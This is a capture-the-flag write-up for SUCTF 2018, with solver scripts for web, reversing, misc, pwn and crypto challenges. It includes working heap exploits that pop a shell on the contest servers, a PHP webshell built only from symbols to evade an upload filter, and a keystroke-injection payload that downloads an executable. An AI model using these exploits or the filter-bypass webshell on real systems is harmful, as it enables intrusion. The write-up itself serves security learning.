# SUCTF 2018

 - [SUCTF 2018](#suctf-2018)
   - [web](#web)
     - [Anonymous (bookgin)](#anonymous-bookgin)
     - [Getshell (unsolved, written bookgin)](#getshell-unsolved-written-bookgin)
   - [rev](#rev)
     - [python (sasdf)](#python-sasdf)
     - [Enigma (sasdf)](#enigma-sasdf)
     - [Rubber Ducky (sasdf)](#rubber-ducky-sasdf)
     - [RoughLike与期末大作业 (sces60107)](#roughlike与期末大作业-sces60107)
     - [babyre (sces60107)](#babyre-sces60107)
     - [simpleformat (sces60107)](#simpleformat-sces60107)
   - [misc](#misc)
     - [TNT (sasdf, bookgin)](#tnt-sasdf-bookgin)
     - [SandGame (b04902036)](#sandgame-b04902036)
     - [Cyclic (b04902036)](#cyclic-b04902036)
     - [Game (b04902036)](#game-b04902036)
   - [pwn](#pwn)
     - [Note (kevin47)](#note-kevin47)
     - [Heap (b04902036)](#heap-b04902036)
   - [crypto](#crypto)
     - [Enjoy (b04902036)](#enjoy-b04902036)
     - [Rsa good (b04902036)](#rsa-good-b04902036)
     - [magic (sasdf)](#magic-sasdf)
     - [rsa (sasdf)](#rsa-sasdf)
     - [pass (sasdf)](#pass-sasdf)
       - [Authentication scheme](#authentication-scheme)
       - [PRNG](#prng)


## web

### Anonymous (bookgin)

- PHP assigned a predictable function name `\x00lambda_%d` to an anonymous function
- Refer to [Oragne's challenges](https://github.com/orangetw/My-CTF-Web-Challenges#babyh-master-php-2017)

Exploit:
1. Make Apache fork, refer to [Orange's script](https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2017/baby%5Eh-master-php-2017/fork.py). It's intended to reset the index of lambda function. 
2. Get flag via `http://web.suctf.asuri.org:81/?func_name=%00lambda_1`

### Getshell (unsolved, written bookgin)

I'm stuck in this problem for about a day, and I really desperate for the writeup. So let me put the reference first(respect!):

Reference:
1. [白帽100安全攻防实验室](https://mp.weixin.qq.com/s?__biz=MzIxMDYyNTk3Nw==&mid=2247484003&idx=1&sn=e27b4e770b3a16245026013545474056&chksm=9760f6b5a0177fa35f21d0260a798a5b774644d45ab74af0e1e74eabbdd4520296a190ada01e&mpshare=1&scene=23&srcid=0528VpCYK8o8P9iyzHwB9thX#rd)
2. [phithon's blog](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)


In this problem, you can upload filename with extension `php`. However, there are some constraint: except for the first 5 characters, the php shell can only contain `$().;=[]_~\n`.

Because the php [short tag](http://php.net/manual/en/language.basic-syntax.phptags.php) is not enabled, the first 5 characters have to be `<?php`. However, how to create a php shell with `$().;=[]_~\n` and unicode characters?

After a few tries, and taking advantage of PHP, I can only create strings "Array", "1", which is definitely not enough to create a webshell.

The key point is:
```php
php > var_dump(臺[1]);
PHP Warning:  Use of undefined constant 臺 - assumed '臺' (this will throw an Error in a future version of PHP) in php shell code on line 1
string(1) "�"
```
Although the unicode character 臺 (which means Tai in Chinese) is not put in quotes, it can still be interpreted. Thank you, PHP!

But the unicode character doesn't contain any ASCII character in case of character set confusion. We can utilize `~` to bypass this.

Here is a PoC. The challenge server uses PHP 5, so `assert` can be used as a dynamic function to RCE.

```python
#!/usr/bin/env python3
# Python 3.6.5

def toUnicode(c):
    byte = 255-ord(c)
    return bytes([0xe4, byte, 0x80]).decode()

print('$_=_==_;') # True, because NULL == NULL
print('$__=' + '.'.join([f'~{toUnicode(c)}[$_]' for c in 'printf']) + ';') # string(4) "printf"
print('$___=' + '.'.join([f'~{toUnicode(c)}[$_]' for c in '_GET']) + ';') # string(4) "_GET"
print(f'$__($$___[$_]);') # $$___[$_] means $_GET["1"]
```

```php
$_=_==_;
$__=~䏀[$_].~䍀[$_].~䖀[$_].~䑀[$_].~䋀[$_].~䙀[$_];
$___=~䠀[$_].~一[$_].~亀[$_].~䫀[$_];
$__($$___[$_]); // printf($_GET["1"]);
```

## rev
### python (sasdf)
We construct the pyc from `opcode.txt` and then decompile with `uncompyle6` (If you are interestring in how to construct pyc, google for types.CodeType and marshal), and then we have following code:
```python
from ctypes import *
from libnum import n2s, s2n
import binascii as b
key = '********'

def aaaa(key):
    a = lambda a: b.hexlify(a)
    return ('').join((a(i) for i in key))

def aa(key):
    a = cdll.LoadLibrary('./a').a
    a(key)

def aaaaa(a):
    return s2n(a)

def aaa(key):
    a = cdll.LoadLibrary('./a').aa
    a(key)

def aaaaaa():
    aaa(aaaa(key))

if __name__ == '__main__':
    aaaaaa()
```
The code is wrong, there's no function `aa` in the library. It's not decompilation error, the provided file is wrong :( However, we know that the encryption function is called with hex-encoded key from this python code. Reverse the library we came up with following decryption code.
```python
def decrypt(enc, key):
    key = binascii.hexlify(key.encode('ascii'))
    key = list(key * (256//len(key)+1))[:256]
    sbox = list(range(256))

    state = 0
    for i in range(256):
        state = (key[i] + sbox[i] + state) & 0xff
        sbox[i], sbox[state] = sbox[state], sbox[i]

    a, b, r = 0, 0, ''
    for c in enc:
        a = (a + 1) & 0xff
        b = (b + sbox[a]) & 0xff
        sbox[a], sbox[b] = sbox[b], sbox[a]
        k = (sbox[a] + sbox[b]) & 0xff
        r += chr(c ^ sbox[k])
    return r
```
But the key is not `********`, search the key using rockyou for printable plaintext to get the flag.

### Enigma (sasdf)
A reverse challenge that encrypt our input then compare to encrypted flag stored in the binary.
```python
with open('Enigma', 'rb') as f:
    input_enc = list(f.read()[0x30a0:][:36])

def bit(a, b):
    return (a >> b) & 1

# sub_11F0
state = 0x5F3759DF
for i in range(9):
    v16 = bit(state, 0) ^ bit(state, 2) ^ bit(state, 3) ^ bit(state, 5) ^ bit(state, 7) ^ bit(state, 31)
    state = (state >> 1) | (v16 << 31)
    for j in range(4):
        input_enc[i*4 + j] ^= (state >> (j*8)) & 0xff

# sub_F1E
def partialRev(c):
    c = bin(c)[2:].rjust(8, '0')
    c = list(map(int, c))
    r = list(reversed(c))
    c = r[:3] + c[3:5] + r[5:]
    return int(''.join(map(str, c)), 2)
input_enc = list(map(partialRev, input_enc))

# sub_124F
wire = [
    [ 0x31, 0x62, 0x93, 0xC4 ],
    [ 0x21, 0x42, 0x63, 0x84 ],
    [ 0x3D, 0x7A, 0xB7, 0xF4 ],
    ]

def _mix(a1, a2, a3):
    a5 = a3 ^ a2 ^ a1
    a4 = a2 & a1 | a3 & (a2 | a1)
    return (a4, a5)

def mix(a2, v16, a4):
    bits = []
    for i in range(8):
        v4 = bit(a2, i)
        v5 = bit(v16, i)
        a4, a5 = _mix(v5, v4, a4)
        bits.insert(0, a5)
    return int(''.join(map(str, bits)), 2), a4

flag = []
for i, t in enumerate(input_enc):
    for c in range(32, 128):
        a4 = 0
        v16 = c

        a2 = wire[0][i%4]
        v16, a4 = mix(a2, v16, a4)

        a2 = wire[1][(i//4%4)]
        v16, a4 = mix(a2, v16, a4)

        a2 = wire[2][i//16]
        v16, a4 = mix(a2, v16, a4)
        if v16 == t:
            flag.append(c)
            break
print(bytes(flag).decode('ascii'))
```

### Rubber Ducky (sasdf)
The challenge provide a intel hex file, after convert to binary, we can find a string `Arduino Micro` at the bottom. The bootloader (i.e. the part that has 20 hex per line) is concatenated after the program. It's not modified so we can strip it off.

As the challenge hex in HITB CTF we solved before, we guess the program is typing some message using Keyboard library. Compiled sample code with `Keyboard::press` and `Keyboard::release`, and then use BinDiff to bring symbols back. The program is typing `rundll32 url.dll,OpenURL XXXXXX`, where URL is dynamically generated. We use `simavr` to get the URL. The simulator cannot go through initialization process, so we need to skip some code. It generate different (i.e. wrong) URLs depends on which part is skipped. However, after multiple run, we have:
```
http://qn-suctf.summershrimp.com/Uz
http://qn-suctf.summershrimXXcom/UzNjcmU3R2
http://qn-suctf.summershrimp.XXm/UzNjcmU3R2FSZG
http://qn-suctf.summershrimp.XXm/UzNjcmU3R2FSZGUO.zip
http://qn-suctf.summershrimp.XXm/UzNjcmU3RAFSZGVO.zip

Manual reconstructed URL:
http://qn-suctf.summershrimp.com/UzNjcmU3R2FSZGVO.zip
```
The zip contains a windows exe, which is a PyInstaller file according to it's icon. Extract with `pyinstxtractor`. The file `RubberDuckey` is a serialized marshal file. Add magic bytes and moddate to convert to pyc. then decompile with `uncompyle6`.

Finally, we got the flag with following decryption code:
```python
cipher = 'YVGQF|1mooH.hXk.SebfQU`^WL)J[\\(`'

res = ''
for i, t in enumerate(cipher):
    for c in range(32, 128):
        cc = c + c % 4 * 2 - i
        if cc == ord(t):
            res += chr(c)
            break
print(res)
```
### RoughLike与期末大作业 (sces60107)

* We are given an unity game
* `strings test_data/level1` you can find the second part of flag`Wow,You Find Second Half Flag _70_5uc7F`
* There is a `First.xml` located at `test_Data/Managed`.
It mention a dll file `Assembly-CSharp.dll` that has been Dotfuscated. After decompiling `Assembly-CSharp.dll`, you can find out that this game use a decrypt funcion before loading assetbundles to memory
* Use de4dot on Assembly-CSharp.dll. Then you can know that the decrypt function is actually base64-decoding with custom table `QRSTUVWXYZABCDEFGHIJKLMNOPabcdefghijklmnopqrstuvwxyz0123456789+/`
* The assetbundles are located at `test_Data/StreamingAssets/bundles`. After decoding those file, we can use [Unity Assets Bundle Extractor](https://7daystodie.com/forums/showthread.php?22675-Unity-Assets-Bundle-Extractor)
* The first part of flag was hidden in `test_Data/StreamingAssets/bundles/WeaponYourself.assetbundle`
```
	name = "Flag",
	ID = "WYS_07",
	type = 8,
	comment = "Hey, look at this one ?!V2VMQzBtRQ==",
	using_times = 1,
	effect = "CannotUse",
	fading_time = 0,
	use_direction = false
```
* The complete flag is `SUCTF{WeLC0mE_70_5uc7F}`
### babyre (sces60107)

* A mips 32-bit binary
* Custom base64 with a custom table `R9Ly6NoJvsIPnWhETYtHe4Sdl+MbGujaZpk102wKCr7/ODg5zXAFqQfxBicV3m8U`
* The base64-encoded flag `eQ4y46+VufZzdFNFdx0zudsa+yY0+J2m`
* After decoding, the flag is `SUCTF{wh0_1s_y0ur_d4ddy}`
* Script:
```python=
a=open("babyre").read()

flag=""
flag2=""
for i in range(0x7b3,0xba4,0x10):
  flag+=a[i]
for i in range(0x107b,0x1364,24):
  flag2+=a[i]
print "base64 custom table:",flag
print "encoded flag:",flag2
flagc=0
for i in flag2:
  flagc*=64
  flagc+=flag.index(i)
print "flag:",hex(flagc)[2:-1].decode("hex")
```
### simpleformat (sces60107)

* The binary `simpleformat` use printf format string to verify flag
* Those format string are mostly in a format like `%1$*2$s`. This format string means taking the second argument as the width. 
* And in the end of all format string is `%20$n`. This format string will count the number of bytes written so far and stored the value to the 20th argument.
* Actually, Those format strings are some linear equations. We can use `z3` to solve those equations.
* Script:
```python=
import re
from z3 import *
from pwn import *
f=open("test")
ff=[]
for i in f.readlines():
  if len(i)>200:
    ff.append(i)
fff=[]
an=open("simpleformat").read()[0x27100:0x27148]
cc=[]
for i in range(0,0x48,4):
  cc.append(u32(an[i:i+4]))
s=Solver()
flag=[]
for i in range(18):
  flag.append(Int("flag"+str(i)))
c=0
for i in ff:
  k={}
  for j in re.findall("\%1\$\*(..?)\$s",i):
    if int(j) not in k:
      k[int(j)]=1
    else:
      k[int(j)]+=1
  temp=0
  for j in k:
    temp+=flag[j-2]*k[j]
  s.add(temp==cc[c])
  c+=1
print s.check()
flag2=""
for i in flag:
  a=hex(int(str(s.model()[i])))[2:]
  a=a.decode("hex")[::-1]
  flag2+=a
print flag2 #SUCTF{s1mpl3_prin7f_l1near_f0rmulas}
```

## misc

### TNT (sasdf, bookgin)

1. List all the GET request queries. `strings tnt.pcap | grep GET`
2. The blind SQL injection enumerates the table name, column name. We are interested in `comment` as it's very long!
3. Extract each bytes. The result is like a base64 string.
```python
#!/usr/bin/env python3
# Python 3.6.5
import urllib.parse
with open('./gets') as f:
    lines = f.read().strip().split('\n')
    queries = [urllib.parse.unquote(line.split(' ')[1]) for line in lines]
    for q in queries:                                                                                                                    
        if '!=' in q and 'comment AS CHAR' in q and 'LIMIT 0'in q:
            print(chr(int(q.split('!=')[-1].split(')')[0])), end='')
```
4. The hint tells us to remove unnecessary character and append missing one. I remove `.` and append another `=` in the end. `(cat b64 && echo '=') | tr -d '.' | base64 -d`
5. The result is a corrputed bzip2 file. Check the [bzip2 spec](https://www.forensicswiki.org/wiki/Bzip2) and we found in the end of the file, the CRC only have 30 bits. Therefore, just brute force the 2 bits and padding 6-bit zeros.
6. After decompressing bzip2, gz, a corrputed jpg file blocks our way. Taking a closer look, we believe this file is related to zip, because there are some `PK` in the file, which is part of the [zip header](https://en.wikipedia.org/wiki/Zip_(file_format)#File_headers).
7. However, the Local file header signature is corrupted. Simply patch these bytes and we can go on.
8. The next is a file which cannot be recognized by linux `file`. @bookgin simply guesses some [archieve formats](https://en.wikipedia.org/wiki/List_of_archive_formats) and found RAR is the answer. Just patch the header again. 
9. @sasdf utilizes a more elegant way to solve this: to spot `CMT` identifier in the file. `CMT` is the [comment identifier](https://www.rarlab.com/technote.htm#srvcmt) in RAR. 
10. We got the flag, finally.

### SandGame (b04902036)

in ```game.py``` we can see that it write the reminder of flag module many numbers into sand.txt, so I use [this website](http://comnuan.com/cmnn02/cmnn0200a/) to get flag.
flag : flag{This_is_the_CRT_xwg)}


### Cyclic (b04902036)

in this task it provide a cyclic xored text using flag as the key.
I first use script provided in [here](https://ehsandev.com/pico2014/cryptography/repeated_xor.html) to analyze the key length and figure it to be of 24 bytes. Then use this [online cracker](https://wiremask.eu/tools/xor-cracker/) to estimate the key. After decode the provided txt with base64 and uploading the file and see the guessed key of 24 bytes, the output contains some almost readable content : 'something'. After some trial and error, I got flag(It becomes easy after we know the flag is of 24 bytes and start with 'something', just random guess a flag and xor it to the provided file, there will be some recognizable words).
flag : flag{Something Just Like This}

### Game (b04902036)
there are three type of game in this chal, we have to play each of them 20 turns perfectly. they are 
1.Nim
2.Wythoff's game
3.http://delphiforfun.org/programs/NIM2_Multi.htm
You can easily find optimal algorithmns of playing these games on the internet. My script is realy messy and include many little optimization. Since the connection won't last more than 90 seconds, it require a good network environment..., I tried near ten times under wired network and finally get flag before the connection timeout.
```python
#!/usr/bin/python
from pwn import *
from hashlib import *
import string
from math import *
import os
import itertools as it
import multiprocessing as mp
def check(p):
    global pre
    if(sha256(pre+p).hexdigest() == ans):
        return p
    return None
def pow():
    global ans
    y = string.ascii_letters + string.digits
    y = it.imap(''.join, it.product(y, repeat=4))
    pool = mp.Pool(32)
    for c in pool.imap_unordered(check, y, chunksize=100000):
        if(c):
            return c
# this is used in second game
g = (1.0 + (5 ** 0.5)) / 2.0
answer = dict()
answer_rev = dict()
for i in range(100000):
    answer[int(floor(i * g))] = int(floor(i * g) + i)
    answer_rev[int(floor(i * g) + i)] = int(floor(i * g))
# / this is used in second game
host = 'game.suctf.asuri.org'
port = 10000
r = remote(host, port)
r.recvuntil('sha256(')
pre = r.recvuntil(' ')[:-1]
r.recvuntil(' == ')
ans = r.recvuntil('\n').strip('\n')
r.sendline(pow())
counter = 0
GG = 3
while(1):
    counter += 1
    #print ('Round ', counter)
    if(counter == 21):
        break
    r.recvuntil('Round')
    r.recvuntil('There are ')
    now = int(r.recvuntil(' ')[:-1], 10)
    r.recvuntil('you can pick ')
    low = int(r.recvuntil(' ')[:-1], 10)
    r.recvuntil('- ')
    high = int(r.recvuntil(' ')[:-1], 10)
    jason = low + high
    ret = now % jason
    if(ret > high or ret < low or (21 - counter <= GG)):
        GG -= 1
        r.sendline('GG')
        continue
    else:
        count = -1
        get = 0
        while(now != 0):
            count += 1
            r.recvuntil(':')
            if(count == 0):
                r.sendline(str(ret))
                now -= ret
            else:
                if(now - jason + get < 0):
                    r.sendline(str(jason - get - low))
                    now = 0
                else:
                    r.sendline(str(jason - get))
                now -= jason
            if(now == 0):
                break
            r.recvuntil('pick ')
            get = int(r.recvuntil('\n')[:-2], 10)
r.recvuntil('===\n')
r.recvuntil('===\n')
counter = 0
#print 'game 2'
# this is the fuction to find cold position in game 2
def solver(nowx, nowy):
    p00 = 0
    p11 = 1
    if(nowx in answer):
        if(answer[nowx] < nowy):
            return (nowy - answer[nowx], p11)
    if(nowx in answer_rev):
        if(answer_rev[nowx] < nowy):
            return (nowy - answer_rev[nowx], p11)
    if(nowy in answer):
        if(answer[nowy] < nowx):
            return (nowx - answer[nowy], p00)
    if(nowy in answer_rev):
        if(answer_rev[nowy] < nowx):
            return (nowx - answer_rev[nowy], p00)
    y = abs(nowx - nowy)
    ret = int(floor(g * y))
    if(((nowx - ret) == (nowy - ret - y) and (nowx - ret) > 0)):
        return (nowx - ret, 2)
    if(((nowx - ret - y) == (nowy - ret) and (nowy - ret) > 0)):
        return (nowy - ret, 2)
    return ('GG', 'GG')
sign = 1
GG = 8
now_time = time.time()
while(sign):
    r.recvuntil('Round')
    p = r.recvuntil('\n').strip()
    counter += 1
    #print ('Round ', p)
    if(int(p) == 20):
        sign = 0
    count = -1
    while(1):
        count += 1
        r.recvuntil('Piles: ')
        if(21 - counter <= GG):
            r.sendline('GG')
            GG -= 1
            break
        p0 = r.recvuntil(' ')[:-1]
        p0 = int(p0, 10)
        p1 = r.recvuntil('\n')[:-1]
        p1 = int(p1, 10)
        r.recvuntil(':')
        if(p0 == 0):
            r.sendline(str(p1) + ' ' + '1')
            break
        elif(p1 == 0):
            r.sendline(str(p0) + ' ' + '0')
            break
        elif(p1 == p0):
            r.sendline(str(p0) + ' ' + '2')
            break
        else:
            ret = solver(p0, p1)
            if(ret[0] == 'GG'):
                sending = 'GG'
                GG -= 1
            else:
                sending = str(ret[0]) + ' ' + str(ret[1])
            r.sendline(sending)
            if(sending == 'GG'):
                break
r.recvuntil('===\n')
r.recvuntil('===\n')
#print 'game 3'
counter = 0
GG = 5
while(1):
    counter += 1
    if(counter == 21):
        break
    r.recvuntil('Round')
    count = 0
    while(1):
        count += 1
        z = r.recvuntil('Piles: ')
        if(21 - counter <= GG):
            r.sendline('GG')
            GG -= 1
            break
        all_p = r.recvuntil('\n').strip().split(' ')
        all_p = [int(all_p[i]) for i in range(len(all_p))]
        now = 0
        for i in range(5):
            now = now ^ all_p[i]
        sending = 'GG'
        _max = 0
        _max_id = -1
        chk = 0
        for i in range(5):
            if(all_p[i] == 0):
                chk += 1
                continue
            now_now = now ^ all_p[i]
            check = all_p[i] - now_now
            if(check > _max):
                _max_id = i
                _max = check
        if(_max_id >= 0):
            sending = str(_max) + ' ' + str(_max_id)
        r.sendline(sending)
        if(chk == 4):
            break
        if(sending == 'GG'):
            GG -= 1
            break
r.interactive()
```
flag : SUCTF{gGGGGggGgGggGGggGGGggGgGgggGGGGGggggggGgGggggGg}
## pwn

### Note (kevin47)

* Overflow in add
* UAF
1. Overflow top chunk's size to create an unsorted bin
2. Call pandora to create second unsorted bin
3. Leak libc and heap
4. Use house of orange to get shell

```python
#!/usr/bin/env python2

from pwn import *
from IPython import embed
import re

context.arch = 'amd64'

r = remote('pwn.suctf.asuri.org', 20003)

def add(size, content):
    r.sendlineafter('>>', '1')
    r.sendlineafter('Size:', str(size))
    r.sendlineafter('Content:', content)

def show(idx):
    r.sendlineafter('>>', '2')
    r.sendlineafter('Index:', str(idx))
    r.recvuntil('Content:')
    return r.recvuntil('1.Add a not', drop=True)

def pandora():
    r.sendlineafter('>>', '3')
    r.sendlineafter('yes:1)', '1')


add(10, 'a'*24+flat(0xec1))
add(4000, 'a')
pandora()
x = show(0).strip()
heap = u64(x.ljust(8, '\x00')) - 0x140
print 'heap:', hex(heap)
add(0x90-8, 'a'*7)
x = show(1).strip()
libc = u64(x.ljust(8, '\x00')) - 0x3bfb58
print 'libc:', hex(libc)

#_IO_list_all = libc + 0x3c5520
_IO_list_all = libc + 0x3c0500
_IO_str_jumps = libc + 0x3bc4c0
#system = libc + 0x45390
system = libc + 0x456d0
pop_rax_rbx_rbp = libc + 0x1fa71
ret = libc + 0x1fa74
add(10, flat(
    'a'*16,
    0x0, 0x61,
    0, _IO_list_all-0x10,
    0, 1,
    0, heap+0x1a0, heap+0x1a0,      # buf_base to heap & buf_end-buf_base==0
    [0]*18, _IO_str_jumps,
    ret, system,                    # malloc do nothing, free(buf_base) == system('/bin/sh')
    '/bin/sh\x00',
))

#raw_input("@")
r.sendlineafter('>>', '1')
r.sendlineafter('Size:', '10')

#embed()
r.interactive()

# SUCTF{Me1z1jiu_say_s0rry_LOL}
```

### Heap (b04902036)

there are four functions : creat(length, content), delete(index), show(index) and edit(index, content)
creat(length, content) : malloc 2 chunk of size "length", let's call them a and b, then read "length" bytes into a and strcpy(b, a), free a and store b in a global array heap_form
delete(index) : free(heap_form[index]), heap_form[index] = NULL
show(index) : show content of heap_form[index]
edit(index, content) : write strlen(heap_form[index]) bytes to heap_form[index]
vulnerability : In function edit(), it allows us to overwrite the size of next chunk, and thus we can perform an unlink, then modify got and get shell.
I choose to overwrite got of free() since everytime the program read input, it will malloc 8 bytes and free it. So we can input '/bin/sh\x00' after we overwrite the got and get shell.
```python
#!/usr/bin/python
from pwn import *
host = 'pwn.suctf.asuri.org'
port = 20004
r = remote(host, port)
def create(length, name):
    r.recvuntil('4:edit')
    r.sendline('1')
    r.recvuntil('input len')
    r.sendline(str(length))
    r.recvuntil('your data')
    if(len(name) == length):
        r.send(name)
    else:
        r.sendline(name)
def delete(idx):
    r.recvuntil('4:edit')
    r.sendline('2')
    r.recvuntil('input id')
    r.sendline(str(idx))
def show(idx, wait=False):
    if(wait):
        r.recvuntil('4:edit')
        r.recvuntil('4:edit', timeout=1)
    else:
        r.recvuntil('4:edit')
    r.sendline('3')
    r.recvuntil('input id\n')
    r.sendline(str(idx))
def edit(idx, name, length):
    r.recvuntil('4:edit')
    r.sendline('4')
    r.recvuntil('input id')
    r.sendline(str(idx))
    r.recvuntil('your data')
    if(len(name) == length):
        r.send(name)
    else:
        r.sendline(name)
heap_form = 0x6020c0
free_got = 0x0000000000602018
free = 0x00000000000844f0
system = 0x0000000000045390 
create(0x98, '1') # 0
create(0x98, '1') # 1
create(0x98, '1') # 2
create(0x98, '1'*0x98) # 3
create(0x98, '1') # 4
edit(3, (p64(0x90 + 0x10 + 0x10) + p64(0x90) + p64(heap_form + 0x18 - 0x18) + p64(heap_form + 0x18 - 0x10)).ljust(0x90, 'a') + p64(0x90) + '\xa0', 0x98 + 1)
delete(4)
edit(3, p64(free_got)[:4], 4)
show(0, True)
libc = r.recvuntil('1:creat')[:-7]
print (len(libc))
libc = u64(libc.strip().ljust(8, '\x00'))
print ('libc : ', hex(libc))
real_system = system + libc - free
print ('system : ', hex(real_system))
edit(0, p64(real_system)[:-2], 6)
r.recvuntil('4:edit')
r.sendline('/bin/sh\x00')
r.interactive()
```

flag : SUCTF{L1gFhAuay4qe29EJrP1MyVWoTGSXJiAzDFdnZLZtTbHKeP2j6bLc}

## crypto

### Enjoy (b04902036)

this is a cbc mode aes, we can encrypt and decrypt arbitary text without terminating the process, and the key is equal to iv. With iv == key, we can reconstruct key by the following method
1. generate a 16 bytes text, called C_1
2. ask server to decrypt a 48 bytes message, which is (C_1, '\X00' * 16, C_1), and get a 48 bytes pseudo plaintext back, which is (P_1, P_2, P_3)
3. key == xor(P_1, P_3)
flag : flag{iv=key_is_danger}


### Rsa good (b04902036)
in this chal of RSA, we can
1. encrypt
2. decrypt
3. get encrypted flag
We can't directly decrypt the flag though, instead the server will return 'permission denied' or somthing like that.
However since RSA is malleable, more percisely, let E(x) denote encrypting x, then E(x) = x ^ e (mod n), and we can have that E(x) * E(y) = E(x * y) mod(n).
now we have E(flag), and we can get E(2), so we ask the server to decrypt E(flag) * E(2) and divide the answer by 2, and get the flag!
flag : SUCTF{Ju5t_hav3_fun_1n_R34_4Ga1N!}

### magic (sasdf)
The hash algorithm in `playMagic` is `sum(bin(magic[i] & key)) % 2`, repeating 256 times to generate 256 bit hash. So we have 256 simultaneous equtations of key under Galois field $F_2$. Solve the equations by Gaussian elimination to get the flag.

### rsa (sasdf)
$$  
\begin{align}  
c &= m^e \times r^e \mod n \\  
m &= c^d \times r^{-1} \mod n  
\end{align}
$$

### pass (sasdf)
Typically, crypto challenge without source or binary is a sign or bad guessing challenge, which takes a lot of time to guess and then solved by trival techniques :(

#### Authentication scheme
This challenge is about an authentication service using some diffie-hellman variant. Authentication scheme on the client side is:
$$  
\begin{align}  
a &= \text{rand}(\text{seed}) \\  
A &= g^a \mod N \\  
&\text{send A, recv B} \\  
x &= \text{password} \\  
S &= B - 3 \times (g^x \mod N) \\  
u &= \text{sha256}(A+B) \\  
T &= S^{a + ux} = S^a \times S^{ux} \mod N \\  
&\text{authenticate using T} 
\end{align}
$$  
The service needs to verify our token T is correct, it knows $A, B, S, x, u$, so it's trival to generate $S^{ux}$ but not $S^a$. There's some ways to solve it:
1. Solve discrete logarithm problem by using special N (e.g. smooth prime). N is a prime so this is not the case.
2. Solve discrete logarithm problem to find a, the provided client only 20 bits random integer for $a$. But the service doesn't crash if I send zero as $A$. So this is not the case.
3. Select special B such as $B = (g^k \mod N) + 3 \times (g^x \mod N)$, so $S^a = A^k \mod N$. There's some sign of this case: B is always smaller than 4N but some times greater than 3N.

#### PRNG
The provided client generate $a$ using current time as seed. If we open multiple connection within one second, the service replies same salt and $B$, which means remote also use PRNG with time as seed. Moreover, the service generated salt is same as our $a$, so we can predict remote's PRNG !!

We guess the service generate $k$ using same PRNG after salt. To verify it, $S - B = 3 \times (g^x \mod N)$ should be multiple of 3. Bingo! Now we have $g^x, S$, we can generate $T = S^a \times (g^x)^{uk} \mod N$
